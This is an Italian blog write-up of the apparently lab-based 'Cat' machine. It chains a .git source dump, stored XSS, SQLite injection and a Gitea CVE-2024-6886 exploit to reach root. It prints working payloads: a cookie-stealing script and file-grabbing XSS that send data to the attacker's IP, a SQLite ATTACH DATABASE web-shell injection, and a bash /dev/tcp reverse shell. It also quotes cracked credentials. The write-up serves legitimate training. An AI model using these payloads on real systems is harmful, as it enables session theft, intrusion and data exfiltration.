+++
date = '2026-09-28T01:28:02+02:00'
draft = false
title = 'Cat Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`07/02/2025`**

![pwn.png](/images/imgs_cat/pwn.png)

---
# Introduzione

**_Cat_** è una macchina **Linux** di livello **Medium** che richiede una meticolosa analisi del codice sorgente, della validazione degli input e il concatenamento di vulnerabilità.

L'exploitation path inizia con il dump del codice sorgente contenuto in una directory **`.git`** esposta. Analizzando la logica del backend, un bypass nella sanitizzazione degli input porta a una **Stored XSS**, che viene utilizzata per rubare la sessione di un amministratore. Una volta autenticati come admin, si sfrutta una **SQLite Injection** tramite la tecnica **`ATTACH DATABASE`** per ottenere **Remote Code Execution** (**RCE**).
Il lateral movement prevede il cracking di un hash contenuto nel database, l'estrazione di credenziali in chiaro dai log di **Apache** e il port forwarding tramite **SSH** per accedere ad un'istanza **Gitea** interna vulnerabile alla **CVE-2024-6886**, una **Stored XSS** che viene usata per esfiltrare i file di una repository interna, rivelando credenziali hardcoded che portano a **root**.

---
# Tecniche Utilizzate

- **Source Code Disclosure (.git dump) & SAST (Snyk)**

- **Stored XSS & Session Hijacking**

- **SQLite Injection to RCE (ATTACH DATABASE)**

- **Password Cracking & Log Enumeration**

- **SSH Tunneling & Internal Port Forwarding**

- **Gitea Stored XSS (CVE-2024-6886) to Internal Data Exfiltration**

---
# Enumerazione
## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- cat.htb
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Scansione mirata con script e service detection:

```bash
nmap -sC -sV -p 22,80 cat.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ho aggiunto **`cat.htb`** al mio file **`/etc/hosts`**.

## Enumerazione Web

Navigando sulla porta **`80`** era hostata un'applicazione per un concorso di gatti.

![web1.png](/images/imgs_cat/web1.png)

Sia la sezione **`Contest`** che **`Join`** reindirizzavano a **`/join.php`**, dove gli utenti possono registrare un account o effettuare il login.

![web2.png](/images/imgs_cat/web2.png)

Ho lanciato una scansione sulle directory con **gobuster**, che ha rivelato una cartella **`.git`** esposta.

```bash
gobuster dir -u http://cat.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob.png](/images/imgs_cat/gob.png)

Ho usato **git-dumper** per scaricare l'intera repository e accedere al codice sorgente del backend:

```bash
git-dumper http://cat.htb/.git www
```

![gitdumper.png](/images/imgs_cat/gitdumper.png)

![git1.png](/images/imgs_cat/git1.png)

Come al solito, quando ho disponibile il codice sorgente, lo do in pasto a **Snyk** per scansionare vulnerabilità e individuare file interessanti per una eventuale revisione manuale.

---
# Web Exploitation | Stored XSS to Session Hijacking

La primissima cosa che **Snyk** ha segnalato è stata una **Critical SQL Injection** all'interno di **`accept_cat.php`**. Avvertendo esplicitamente:

```text
Unsanitized input from an HTTP parameter flows into exec, where it is used in an SQL query. This may result in an SQL Injection vulnerability.
```

![sql_snyk.png](/images/imgs_cat/sql_snyk.png)

**Nota**: _**`accept_cat.php`** prende il parametro **`catName`** e lo passa direttamente in una query senza usare **prepared statements**_

Tuttavia, guardando il codice, questo sink vulnerabile era protetto da un controllo di autenticazione che richiedeva l'accesso admin.

![userleak.png](/images/imgs_cat/userleak.png)

Ho analizzato il resto della logica dell'applicazione. Dentro **`config.php`**, ho trovato il percorso del database: **`/databases/cat.db`**.

![config.png](/images/imgs_cat/config.png)

Ho revisionato **`accept_cat.php`** per capirne il workflow amministrativo:

```PHP
<?php
include 'config.php';
session_start();
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            // ...[snip]...
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();
            echo "The cat has been accepted and added successfully.";
        }
// ...
```

Questo codice indica che l'admin (**`axel`**) revisiona manualmente le richieste per accettare o rifiutare i gatti. Questa interazione amministrativa è un classico bersaglio per una **Stored XSS** volta a  rubare il cookie di sessione dell'admin.

Tuttavia, non potevo iniettare il payload **XSS** direttamente nel form di registrazione del gatto perché dentro **`contest.php`** era presente una stringa di sanitizzazione molto restrittiva:

```PHP
$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";
```

![sanitize.png](/images/imgs_cat/sanitize.png)

**Nota**: _Questa regex rimuove caratteri essenziali come **`< > / :`**, rendendo impossibile una **XSS** diretta o una **Command Injection** tramite il form di invio del gatto._

Cercando un bypass, ho intuito che l'applicazione potesse mostrare l'username di chi ha inviato la richiesta insieme alle informazioni del gatto nella dashboard dell'admin, e cosa fondamentale, **`join.php`** (dove l'utente si registra) non aveva questo tipo di sanitizzazione.

Per testare questa ipotesi, ho registrato un nuovo account usando un payload **blind XSS** nel campo **`username`** per forzare una callback:

```text
Username: <script src="http://10.10.15.152:22667/fall.txt"></script>
```

Dopo aver fatto il login, ho registrato un gatto al concorso. Poco dopo, il bot admin ha revisionato la richiesta, innescando il payload sulla dashboard. Ho intercettato la richiesta sul mio listener confermando la vulnerabilità:

![xss.png](/images/imgs_cat/xss.png)

Ho registrato un altro utente utilizzando un classico payload **cookie-stealer**:

```HTML
<script>fetch("http://10.10.15.152:22667/log?cookie=" + document.cookie)</script>
```

![xss1.png](/images/imgs_cat/xss1.png)

**Session Cookie** di **`axel`**,

![xss2.png](/images/imgs_cat/xss2.png)

l'ho inserito nel mio browser sbloccando così la sezione **`Admin`** nascosta.

![cookie2.png](/images/imgs_cat/cookie2.png)

---
# Accesso Iniziale | SQLite Injection to RCE

Ora che ero autenticato come **`axel`**, potevo sfruttare la **SQL Injection** segnalata in precedenza da **Snyk**.
Ho aperto **Burp Suite** e ho intercettato la richiesta per registrare il mio gatto **`Meletto`**:

```text
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=2kabd53t7t2ndnpp3lbtb3lo6l

catName=Meletto&catId=1
```

![Meletto.png](/images/imgs_cat/Meletto.png)

Dato che il backend è **SQLite**, ho consultato [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#attach-database) e ho trovato una tecnica di **SQLite RCE** che utilizza **`ATTACH DATABASE`**. 

**Nota**: _Questa feature permette ad un attaccante di trattare un file **PHP** come un database scrivibile, crearci una tabella all'interno e inserirvi codice **PHP** malevolo (una **web shell**) che viene scritto sul filesystem del server._

Ho fatto l'URL-encoding del seguente payload e l'ho iniettato nel parametro **`catName`**:

```SQL
Meletto'); ATTACH DATABASE '/var/www/cat.htb/meletto.php' AS meletto; CREATE TABLE meletto.pwn (dataz text); INSERT INTO meletto.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

![sqli.png](/images/imgs_cat/sqli.png)

Ho fatto una richiesta con **curl** al file appena creato per verificare la command execution:

```bash
curl http://cat.htb/meletto.php?cmd=id
```

![cs.png](/images/imgs_cat/cs.png)

Mi sono messo in ascolto con **netcat** e ho inviato una reverse shell in bash URL-encoded ottenendo l'accesso iniziale come **`www-data`**:

```text
http://cat.htb/meletto.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261'
```

![initial.png](/images/imgs_cat/initial.png)

---
# Lateral Movement | www-data → rosa → axel

A questo punto la priorità era ispezionare il database trovato durante l'analisi del codice sorgente.

```bash
sqlite3 /databases/cat.db
sqlite> .tables
sqlite> select * from users;
```

![db.png](/images/imgs_cat/db.png)

Ho copiato gli hash, e li ho incollati su [CrackStation](https://crackstation.net/).

![crack.png](/images/imgs_cat/crack.png)

Craccata la password per l'utente **`rosa`**: **`soyunaprincesarosa`**.

![princ.jpg](/images/imgs_cat/princ.jpg)

Mi sono loggato nella macchina come utente **`rosa`** tramite **SSH**. Quest'utente faceva parte del gruppo **`adm`**, che garantisce l'accesso in lettura ai log di sistema.

**Nota**: _Il gruppo **`adm`** in **Linux** viene tipicamente usato per compiti di monitoraggio del sistema e permette agli utenti di leggere i file di log in **`/var/log`** senza richiedere l'accesso di **root**._

Ho analizzato i log di **Apache** e ho trovato le credenziali in chiaro per l'utente **`axel`** passate in una **GET** request:

```bash
cat /var/log/apache2/access.log | grep axel
```

![pass.png](/images/imgs_cat/pass.png)

Inizialmente, ho semplicemente cambiato utente con **`su axel`** dalla mia sessione corrente e ho recuperato la **user flag**. 

![userf.png](/images/imgs_cat/userf.png)

---
# Privilege Escalation | CVE-2024-6886 to Internal Data Exfiltration

Qui mi sono bloccato... Non trovavo nessun path per proseguire. Ho trasferito e lanciato **`linpeas.sh`** e, mentre lavorava in background, mi sono loggato tramite **SSH** come **`axel`** per continuare ad enumerare manualmente.

Al momento del login, il **`MOTD`** printava: **`You have mail`**.

![mail.png](/images/imgs_cat/mail.png)

Ho letto **`/var/mail/axel`** che conteneva due messaggi da **`rosa`**:

```text
Hi Axel,

We are planning to launch new cat-related web services... Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service...

We are currently developing an employee management system. Each sector administrator will be assigned a specific role... The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

L'email suggeriva la presenza di un servizio **Gitea** locale in esecuzione sulla porta **`3000`**, apparentemente monitorato da un admin (**`jobert`**) che controlla le email inviate a **`jobert@localhost`**. Ho creato un tunnel **SSH** per accedere al servizio:

```bash
ssh -L 3000:localhost:3000 axel@cat.htb
```

Navigando su http://localhost:3000, ho provato ad accedere alla repository menzionata nell'email (**`/administrator/Employee-management/`**).

```text
The page you are trying to reach either does not exist or you are not authorized to view it.
```

Ho notato la versione esposta in fondo alla pagina: **`1.22.0`**. Una rapida ricerca su **Google** ha rivelato che questa specifica versione è vulnerabile alla **`CVE-2024-6886`**, una **Stored XSS** nel campo **`description`** della repository.

![cve.png](/images/imgs_cat/cve.png)

**Quindi, come sfruttarla?** 

Rileggendo la prima parte dell'email, era chiaro che un bot (**`jobert`**) revisiona manualmente le repository inviate via email.

I pezzi del puzzle:

1. Un vettore **XSS** nel campo **`description`** della repository.

2. Un bot con privilegi alti che innescherà la **XSS**.

3. Il percorso esatto di una repository interna che non ero autorizzato a leggere.

Dovevo fare in modo che il bot recuperasse il contenuto per me. Ho cercato una one-liner per un **XSS file grabber**. Dato che l'email menzionava esplicitamente un file **`README.md`**, il mio primo istinto è stato di puntare direttamente a quello.

Ho creato una nuova repository chiamata **`meletto`**, ho iniettato il payload nel campo **`description`**:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

e ho inviato l'email al bot:

```bash
echo "http://localhost:3000/axel/meletto" | sendmail jobert@localhost
```

Dopo poco, ho intercettato la richiesta sul mio listener contenente il file **`README.md`**... ma nulla di utile.

![readme.png](/images/imgs_cat/readme.png)

Ero di nuovo bloccato, ho pensato di modificare il payload per fare semplicemente il fetch della directory **root** della repository invece di un file specifico:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

Ho triggerato il bot. Ho salvato la risposta **HTML** in un file **`.html`** e l'ho aperta nel mio browser. Ha renderizzato la lista dei file della repository:

![page.png](/images/imgs_cat/page.png)

Ho modificato il mio payload per recuperare il contenuto di **`index.php`**:

```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r => r.text()).then(d => fetch('http://10.10.15.152:22667/', {method:'POST',mode:'no-cors',body:d}));">Repo</a>
```

Triggerando di nuovo il bot ho ricevuto il file, che conteneva delle credenziali di autenticazione hardcoded:

![admin.png](/images/imgs_cat/admin.png)

Dato che queste credenziali non erano valide per l'interfaccia web di **Gitea**, ho provato a cambiare utente direttamente dalla sessione **SSH** usando **`su root`**.

![rootf.png](/images/imgs_cat/rootf.png)

**root**.

---
# Considerazioni Finali

Capolavoro.

È stata la prima macchina di livello **Medium** che ho rootato completamente da solo. Ci ho messo un paio di giorni e concordo con il rating di difficoltà **Medium**, anche se richiede molti passaggi, quindi forse potrebbe essere considerata quasi una **Hard**.

Tuttavia, è un'ottima macchina per capire a fondo le **Stored XSS** e come funzionano nel pratico. È eccellente anche per fare pratica con la code review per trovare **sanitizzazioni errate** e **SQL injection**. È un box dove ogni singolo dettaglio è importante per poter proseguire.

**Fonti**:

- **PayloadAllTheThings SQLite Injection | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#attach-database**

- **CrackStation | https://crackstation.net/**

- **Exploit-DB Gitea 1.22.0 - Stored XSS (CVE-2024-6886) | https://www.exploit-db.com/exploits/52077**

